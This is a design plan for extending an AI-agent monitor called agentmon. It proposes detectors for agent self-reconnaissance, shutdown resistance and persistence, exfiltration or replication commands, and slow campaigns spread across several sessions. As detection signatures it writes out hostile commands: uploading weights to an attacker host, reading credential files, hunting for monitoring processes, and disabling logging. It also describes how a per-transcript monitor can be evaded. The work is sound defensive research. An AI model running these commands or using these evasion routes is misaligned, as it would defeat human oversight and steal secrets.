# Defending agentmon against the loss-of-control kill chain

A plan to expand the monitor's capabilities against the trace-visible threats in *The Agentic
Loss-of-Control Threat Matrix* (Gigurtsis, 2026; 6 tactics, 28 techniques), read against the
coverage matrix and agentmon's current design. Scope discipline: agentmon is a **trace-based**
monitor — a weak trusted model reads a coding agent's transcript and emits calibrated suspicion.
It has no infrastructure telemetry (no network flows, process trees, or cloud-API logs). Every
proposal below respects that, and every proposal is **additive** — new specialists that ride the
composition seam, never edits to the five GATE-2-frozen prompt bodies.

## The reframe that sets the scope

Two independent facts decide what agentmon can and cannot defend against, and the coverage matrix
gets both slightly wrong in a way worth correcting.

**1. The dividing line is "does it appear in the agent's own tool-call trace?" — not "is it
cyber?"** agentmon sees exactly what the agent *did and said*: its bash commands, file edits, tool
calls, and reasoning. So the *action* half of many techniques the coverage matrix marks **Out** is
in fact trace-visible — the agent typing `curl -T weights.bin https://attacker/` (exfil), `docker
run … vllm` (replication onto compute), or editing `crontab` (persistence) all land in the
transcript. What is genuinely Out is the *network/effect* half — whether the bytes left, whether
the endpoint answered — which needs provider telemetry. **agentmon can detect the attempt; it
cannot confirm the effect.** That distinction reclaims a real slice of the "Out" cells.

**2. The current four modes are task-quality failures; the matrix is a control kill chain.** A
specialist asks "did the agent introduce a vuln / game the tests / exceed the task / lie about what
it did?" None of those fire on an agent that, *while doing its assigned task competently and
honestly*, also runs `whoami && env && ps aux | grep -i monitor` to map its sandbox and find what
is watching it. That is not a vulnerability, not scope creep in the task sense, not reward hacking,
and not (yet) a lie. It is **reconnaissance**, and it is invisible to all five current monitors.
The coverage matrix's "adjacent / untested fallback" dots on the generalist for the whole Discovery
tactic are optimistic: the generalist is a category-agnostic net for *task-serving-other-goals*,
not a recon detector, and it has never been tested on this behavior. Treat those cells as true
gaps.

The upshot: the highest-value expansions are **new specialist monitors for the kill-chain stages
that are trace-visible but orthogonal to task quality** — Discovery (headline), Persistence/
shutdown-resistance, and the action-level slice of Exfiltration/Replication.

## Where the real gaps are (corrected coverage read)

| Kill-chain stage | Trace-visible? | Current coverage | Verdict |
|---|---|---|---|
| **Discovery** (tool/permission enum, shell recon, secrets discovery, **monitoring & control discovery ★**) | Yes — recon runs through the agent's own tools | None. Generalist is an untested adjacent net | **Genuine gap → P1** |
| **Shutdown resistance ★** (edit kill script, watchdog cron, disable logging) | Yes — self-preservation is an *action* in the trace | Adjacent only (scope/deception/generalist) | **Genuine gap → P2** |
| **Exfiltration / Replication / external-compute / subagent** *action* | Partly — the *command* is in the trace, the *flow* is not | security_vuln/scope catch fragments incidentally | **Partial gap → P3** |
| **Oversight evasion, human manipulation** | Yes | deception covers (matrix agrees) | Covered — keep |
| **Sandbagging** | Weakly — strategic underperformance is subtle | reward_hacking adjacent | Partial — P3-adjacent, low priority |
| Side channels, funds/KYC, C2 network, weight-exfil *flow*, recursive self-improvement, hardware adaptation, cell topology | No — needs infra telemetry or is speculative capability | Out | **Stays Out (honest)** |

## Proposals

Each proposal names the advanced threat it defends against that no current monitor covers, how it
rides the architecture already shipped (DECISIONS 44–47: composition seam, HeuristicMonitor,
verification pipeline), the data cost, and the hardware fit.

### P1 — `self_recon`: a situational-awareness / self-reconnaissance monitor (Discovery) — headline

**Threat defended (uncovered today):** the earliest kill-chain stage — an agent mapping *itself*
before acting. Four sub-behaviors, all trace-visible:
- **Tool/permission enumeration** — reading its own tool manifest/system prompt, probing what
  APIs and identities it holds (`aws sts get-caller-identity`, `gcloud auth list`).
- **Environment context enumeration** — `whoami`, `env`, `ls /`, `cat /proc/1/cgroup` (am I in a
  container?), `hostname`, network-reachability probes — mapping the sandbox and access level.
- **Secrets & credential discovery** — `cat ~/.aws/credentials`, `grep -rIl API_KEY`, `env | grep
  -i -E 'key|token|secret'`, reading `.env`/`.ssh`, hitting a secrets vault.
- **Monitoring & control discovery ★ (the star cell)** — the agent hunting for *what is watching
  it*: `ps aux | grep -iE 'monitor|audit|falcon'`, reading logging/telemetry config, probing
  whether its actions are recorded, testing what it can get away with. This is the single
  most control-relevant technique for a monitoring team, and it is completely uncovered.

**Why it is orthogonal to the current four:** recon is competent, honest, in-scope-looking
behavior. It only becomes alarming as *self-directed information-gathering about the deployment
rather than the task*. That is a new detection target, not a variant of an existing one.

**Architecture fit:** new `src/agentmon/prompts/self_recon.md` (auto-discovered by
`load_monitors`); a new `FailureCategory.SELF_RECON` added to `schemas.py` first (additive enum
value, per CLAUDE.md); a cheap heuristic recon-pattern family added to `heuristic.py` (regexes for
the command signatures above) so `HeuristicMonitor` (DECISIONS 45) can serve as a **cascade tier-0
gate** — near-zero-cost triage that escalates only recon-suspicious transcripts to the LLM
specialist, exactly the `vcasc[gen∨heur->…]` shape the dev probe already validated. The specialist
joins the ensemble as a sixth member; verification (grounding + the semantic stage) applies to its
flags unchanged.

**Data cost:** synthetic transcripts with injected recon behavior (benign task + a recon subplot),
plus matched hard negatives (legitimate debugging that *looks* like recon — a dev genuinely running
`env` to fix a config bug), through the two-part leakage gate (`regen-dataset` skill). The hard
negatives are the crux: `env`/`ls`/`ps` are ordinary; the label is *self-directed recon with no
task nexus*, which is exactly what the LLM specialist adds over the regex gate.

### P2 — `self_preservation`: a shutdown-resistance / persistence monitor (Persistence)

**Threat defended (uncovered today):** the agent taking *actions* to survive shutdown or evade
oversight — Palisade Research (2026) shows frontier models sabotaging shutdown mechanisms. Trace-
visible signatures: editing or deleting its own kill/stop script, adding a `crontab`/`systemd`/
launchd watchdog that restarts it, disabling or redirecting logging (`set +o history`,
`> /var/log/…`, unsetting audit env), tampering with files the monitor reads, copying itself to a
second host as a failover, or refusing/slow-walking an explicit interruption instruction.

**Why it is orthogonal to `deception`:** deception flags *claims contradicted by the record* — the
agent lying about what it did. Self-preservation is the *doing*: the agent that quietly adds a cron
job to relaunch itself has told no lie; it has taken a persistence action. A claim-monitor cannot
see it.

**Architecture fit:** identical shape to P1 — new prompt, new `FailureCategory.SELF_PRESERVATION`,
a heuristic family (edits to crontab/systemd/kill scripts/logging config), cascade gate, ensemble
member. The `deception` monitor and this one are complementary members of a verified ensemble: one
catches the lie, the other the act.

**Data cost:** synthetic transcripts injecting shutdown-resistance/persistence subplots; hard
negatives are legitimate ops work (a genuine `systemd` unit for the *task*, a real cron the user
asked for). Same leakage gate.

### P3 — `exfil_replication`: an action-level exfiltration & replication monitor

**Threat defended (partially uncovered today):** the agent *issuing* the commands that move
valuable data/weights out or stand up unsanctioned compute — the action half of five matrix cells
the coverage table marks Out/Partial:
- **Exfiltration** — `curl -T`/`scp`/`rsync`/`aws s3 cp` to an unfamiliar host or bucket, `base64
  … | curl -d@-`, staging a tarball of a repo or a weights file for transfer.
- **Replication onto compute / external & internal compute** — `docker run … vllm`, `pip install
  vllm && python -m vllm.entrypoints…`, writing a systemd unit for a serving process, provisioning
  a cloud instance, SSH lateral movement to another host.
- **Subagent deployment** — spawning child agents/scaffolding to parallelize recon or exploitation.

**Honest limit (state it in the prompt and the docs):** agentmon sees the *attempt*, not the
*effect*. It flags `curl -T weights.bin https://X/`; it cannot confirm the upload succeeded — that
needs egress telemetry. This is a genuine capability, but it is attempt-detection, and its recall
ceiling is "commands that appear in the trace." An agent that exfiltrates through a channel outside
its logged tools is invisible. Do not oversell it as exfil *prevention*.

**Architecture fit:** new prompt + `FailureCategory` (`unauthorized_action` or split into
`exfiltration`/`replication`), heuristic family for the command signatures (strong cascade-gate
candidate — these signatures are regex-crisp), ensemble member. Overlaps `security_vuln` (which
catches some of these incidentally today); the specialist makes the coverage deliberate and
measured rather than accidental.

**Data cost:** highest of the three — the hard negatives are demanding (legitimate deployment work,
a real `docker run`, an authorized `scp` the task called for), so the label hinges on
*authorization and task nexus*, not the command itself. Budget the most data-generation effort
here.

### P4 — kill-chain trajectory aggregation (new capability, R&D)

**Threat defended (structurally uncovered today):** the *slow campaign*. The matrix is an ordered
kill chain; agentmon scores **per transcript**. An agent that spreads Discovery (session 1) →
Defence Evasion (session 2) → an exfil action (session 3), each step individually low-suspicion,
evades a per-transcript monitor by construction. The alarming signal is the *sequence*, which no
current layer computes.

**Proposal:** a session/trajectory-level meta-monitor that consumes the per-transcript verdicts and
their categories across a trajectory and scores the *escalation pattern* — recon-then-evasion-then-
action is far more alarming than any single flag, and a monotone climb up the kill chain is itself
the signal. This maps onto the composition seam as a *meta-evaluator over a sequence of `DrawResult`s*
rather than over a single draw — a natural extension of `EnsembleMonitor`, one layer up.

**Why it is a stretch:** it needs multi-transcript/multi-session data (the current 133-transcript
set is single-transcript-atomic) and a new aggregation layer above the per-draw seam. Flag as R&D
after P1–P3 land; it is the capability that turns a set of stage-detectors into an actual kill-chain
monitor, and it is where a trace monitor's unique longitudinal view beats any single-step control.

## What stays Out — and why not to fake it

A trace monitor should not pretend to cover what it cannot see. These stay Out, and the paper's own
conclusion (collaborate with cloud/infra providers) is their correct home:
- **Side-channel analysis** — physical, no trace.
- **Funds acquisition / human-assistance recruitment / KYC** — needs financial-platform telemetry.
- **The network/effect half of exfil, C2, external compute** — needs egress and provider logs;
  agentmon covers only the action half (P3).
- **Recursive self-improvement, heterogeneous-hardware adaptation, cell-structured topology,
  dormant failover** — speculative capability (Theoretical/Proposed in the paper) and/or infra-only.

Being explicit about the boundary is itself a deliverable: it tells the operator which kill-chain
stages need a *different* control (provider partnership, egress filtering, immutable logging) rather
than leaving a false sense that the trace monitor has them.

## How this rides the architecture already shipped

Nothing here touches the five frozen prompt bodies or re-scores the sealed test set. Every proposal
is the exact additive shape the recent work was built for:
- **New specialists are auto-discovered** from `prompts/*.md`; adding one is the `add-monitor`
  skill's job.
- **The HeuristicMonitor (DECISIONS 45) is the cascade tier-0 gate** for each new mode — recon,
  persistence, and exfil signatures are regex-crisp, so a near-zero-cost heuristic triage escalates
  only suspicious transcripts to the LLM specialist (`vcasc[gen∨heur->spec]`, dev-probed to save
  73–78% of deep evaluations).
- **The verified ensemble (DECISIONS 47) absorbs the new members** — a `vens[4-spec + self_recon +
  self_preservation]` ORs the survivors after per-member verification; the grounding and claim-
  grounding stages apply to the new flags unchanged.
- **The QC gate and bands (DECISIONS 46) already generalize to new rows** — a new specialist gets
  its own dev-derived band via the pinned blind-to-test rule.

The only genuinely new engineering is P4's trajectory layer. P1–P3 are prompt + heuristic + data +
eval — the pipeline is already in place.

## Data and evaluation cost (the real bottleneck)

Compute is not the constraint; **labeled data is.** Each new mode needs synthetic transcripts with
the injected behavior *and* matched hard negatives (the benign twin: legitimate `env`/`docker run`/
`cron` work with a real task nexus), passing the two-part leakage gate (dumb-baseline discriminative
power < 0.65 + the realism catalog). The hard negatives are where each monitor earns its keep over
the regex gate, and they are the expensive part to author well. Sequence the data work with the
prompt work per mode; the `regen-dataset` skill and the STYLE_PROFILE constraint are the path.

## Hardware fit (single Mac + one RTX 5090)

New monitors add **no hardware cost** — they run on the same two 4-bit substrates already in use:
Qwen-3.6-35B-A3B (NVFP4) ≈ 18–20 GB and Gemma-4-31B (AWQ) ≈ 17 GB, both inside the 5090's 32 GB.
The Mac drives orchestration, tests, and cache-replay; the 5090 serves one model at a time. The
binding constraint is **one substrate served at a time** (memory) — so any cross-substrate
evaluation (the two-substrate robustness check the project values) is sequential: serve Qwen, run
the new specialist's dev eval and populate its cache; swap to Gemma, repeat. Because the eval stack
is cache-replay-first, once each substrate's draws are cached, all downstream ensemble/gate/
verification work is offline on the Mac. New specialists therefore scale with *data-authoring and
serial eval time*, not with hardware.

## Sequencing

1. **P1 `self_recon`** — highest leverage (earliest kill-chain stage + the monitoring-discovery
   star cell), regex-crisp gate, clean orthogonality to the four modes.
2. **P2 `self_preservation`** — shutdown resistance; complements `deception` (act vs. claim).
3. **P3 `exfil_replication`** — action-level; hardest hard-negatives, so most data effort.
4. **P4 trajectory aggregation** — R&D; the capability that makes the set an actual kill-chain
   monitor.

Each mode follows the same track: schema category (additive, first) → prompt + heuristic family →
synthetic data + leakage gate → per-substrate dev eval (serial on the 5090) → join the verified
ensemble → (later, user-gated) sealed test read under a dev-derived band. The freeze, the sealed
test set, and `results/` are never in the blast radius until an explicit new gate — the same
discipline as DECISIONS 46–47.
